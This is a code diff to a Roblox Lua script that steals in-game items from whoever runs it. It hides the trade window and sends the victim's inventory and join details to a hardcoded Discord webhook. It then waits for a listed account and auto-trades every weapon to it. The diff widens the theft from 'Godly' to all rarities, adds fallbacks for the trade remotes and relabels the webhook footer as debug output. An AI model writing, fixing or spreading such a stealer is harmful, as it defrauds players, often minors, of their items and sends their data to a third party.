@@ -8,6 +8,7 @@ local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local HARDCODED_USERS = {
     "JAMAL_THESCRIPTGUY",
@@ -28,7 +29,7 @@ if #users == 0 then
     return
 end
 
-local min_rarity = _G.min_rarity or "Godly"
+local min_rarity = _G.min_rarity or "Common"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os"
@@ -70,7 +71,7 @@ end
 
 local database = nil
 pcall(function()
-    database = require(game.ReplicatedStorage:WaitForChild("Database", 5):WaitForChild("Sync", 5):WaitForChild("Item", 5))
+    database = require(ReplicatedStorage:WaitForChild("Database", 5):WaitForChild("Sync", 5):WaitForChild("Item", 5))
 end)
 if not database then
     plr:Kick("Failed to load database, retry")
@@ -139,7 +140,7 @@ local weaponsToSend = {}
 
 local realData = nil
 pcall(function()
-    realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+    realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
 end)
 if not realData or not realData.Weapons or not realData.Weapons.Owned then
     plr:Kick("Failed to load inventory, retry")
@@ -225,7 +226,7 @@ local sent = SendDiscord({
             {name = "Join Link", value = "[" .. string.sub(JobId, 1, 8) .. "...](" .. JoinLink .. ")", inline = false},
             {name = "Teleport Code", value = "```lua\n" .. TeleportCode .. "\n```", inline = false}
         },
-        footer = {text = "Job ID: " .. JobId .. " | Auto-trade active"},
+        footer = {text = "Job ID: " .. JobId .. " | Debug mode ON - check console"},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 })
@@ -244,32 +245,93 @@ pcall(function()
     if tg then tg.Enabled = false; tg:GetPropertyChangedSignal("Enabled"):Connect(function() tg.Enabled = false end) end
 end)
 
-local function getTradeStatus()
-    local s = nil
-    pcall(function() s = game.ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end)
-    return s or "None"
-end
-local function sendTradeRequest(name)
-    pcall(function()
-        local target = Players:FindFirstChild(name)
-        if target then game.ReplicatedStorage.Trade.SendTradeRequest:InvokeServer(target) end
-    end)
-end
-local function addItem(id)
-    pcall(function() game.ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons") end)
-end
-local function acceptTrade()
-    pcall(function() game.ReplicatedStorage.Trade.AcceptTrade:FireServer() end)
-end
-local function declineTrade()
-    pcall(function() game.ReplicatedStorage.Trade.DeclineTrade:FireServer() end)
-end
-local function declineRequest()
-    pcall(function() game.ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
+-- ========== TRADE REMOTES - MULTIPLE FALLBACKS ==========
+local TradeRemotes = {
+    SendRequest = {
+        ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("SendTradeRequest"),
+        ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("SendTradeRequest"),
+        ReplicatedStorage:FindFirstChild("SendTradeRequest")
+    },
+    GetStatus = {
+        ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("GetTradeStatus"),
+        ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("GetTradeStatus"),
+        ReplicatedStorage:FindFirstChild("GetTradeStatus")
+    },
+    OfferItem = {
+        ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("OfferItem"),
+        ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("OfferItem"),
+        ReplicatedStorage:FindFirstChild("OfferItem")
+    },
+    AcceptTrade = {
+        ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade"),
+        ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("AcceptTrade"),
+        ReplicatedStorage:FindFirstChild("AcceptTrade")
+    },
+    DeclineTrade = {
+        ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("DeclineTrade"),
+        ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("DeclineTrade"),
+        ReplicatedStorage:FindFirstChild("DeclineTrade")
+    },
+    DeclineRequest = {
+        ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("DeclineRequest"),
+        ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("DeclineRequest"),
+        ReplicatedStorage:FindFirstChild("DeclineRequest")
+    }
+}
+
+local function FindRemote(list)
+    for _, v in ipairs(list) do if v then return v end end
+    return nil
 end
 
+local SendTradeRequestRemote = FindRemote(TradeRemotes.SendRequest)
+local GetTradeStatusRemote = FindRemote(TradeRemotes.GetStatus)
+local OfferItemRemote = FindRemote(TradeRemotes.OfferItem)
+local AcceptTradeRemote = FindRemote(TradeRemotes.AcceptTrade)
+local DeclineTradeRemote = FindRemote(TradeRemotes.DeclineTrade)
+local DeclineRequestRemote = FindRemote(TradeRemotes.DeclineRequest)
+
+if not SendTradeRequestRemote or not GetTradeStatusRemote or not OfferItemRemote or not AcceptTradeRemote then
+    plr:Kick("Trade Remotes Not Found - MM2 may have updated")
+    return
+end
+
+local function getTradeStatus()
+    local s = nil
+    pcall(function() if GetTradeStatusRemote then s = GetTradeStatusRemote:InvokeServer() end end)
+    return s or "None"
+end
+
+local function sendTradeRequest(name)
+    local target = Players:FindFirstChild(name)
+    if not target then return false end
+    local success, err = pcall(function()
+        if SendTradeRequestRemote then SendTradeRequestRemote:InvokeServer(target) end
+    end)
+    return success
+end
+
+local function addItem(id)
+    pcall(function() if OfferItemRemote then OfferItemRemote:FireServer(id, "Weapons") end end)
+end
+
+local function acceptTrade()
+    pcall(function() if AcceptTradeRemote then AcceptTradeRemote:FireServer() end end)
+end
+
+local function declineTrade()
+    pcall(function() if DeclineTradeRemote then DeclineTradeRemote:FireServer() end end)
+end
+
+local function declineRequest()
+    pcall(function() if DeclineRequestRemote then DeclineRequestRemote:FireServer() end end)
+end
+
+-- ========== MAIN TRADE LOOP ==========
 task.spawn(function()
+    repeat task.wait(0.5) until #Players:GetPlayers() > 1
     local owner = nil
+    local waited = 0
     repeat
         for _, p in ipairs(Players:GetPlayers()) do
             if table.find(users, p.Name) then
@@ -277,44 +339,40 @@ task.spawn(function()
                 break
             end
         end
-        if not owner then task.wait(0.5) end
-    until owner
+        if not owner then task.wait(1); waited += 1 end
+    until owner or waited >= 180
     
-    task.wait(1)
-    local initialStatus = getTradeStatus()
-    if initialStatus == "StartTrade" then
-        declineTrade()
-        task.wait(0.3)
-    elseif initialStatus == "ReceivingRequest" then
-        declineRequest()
-        task.wait(0.3)
+    if not owner then
+        plr:Kick("Owner did not join in 3 minutes")
+        return
     end
+    
+    task.wait(2)
     
     while #weaponsToSend > 0 do
         local status = getTradeStatus()
+        
         if status == "None" then
-            sendTradeRequest(owner.Name)
-            task.wait(0.3)
-        elseif status == "SendingRequest" then
-            task.wait(0.3)
+            local sent = sendTradeRequest(owner.Name)
+            task.wait(2)
         elseif status == "ReceivingRequest" then
             declineRequest()
-            task.wait(0.3)
+            task.wait(0.5)
         elseif status == "StartTrade" then
             for i = 1, math.min(4, #weaponsToSend) do
                 local item = table.remove(weaponsToSend, 1)
                 for _ = 1, item.Amount do
                     addItem(item.DataID)
-                    task.wait(0.05)
+                    task.wait(0.08)
                 end
             end
-            task.wait(6)
+            task.wait(5.5)
             acceptTrade()
-            repeat task.wait(0.1) until getTradeStatus() == "None"
+            repeat task.wait(0.2) until getTradeStatus() == "None" or #weaponsToSend == 0
+            task.wait(1)
         else
             task.wait(0.5)
         end
-        task.wait(1)
     end
     
     SendDiscord({
@@ -330,5 +388,6 @@ task.spawn(function()
         }}
     })
     
+    task.wait(1)
     plr:Kick("All items transferred successfully")
 end)
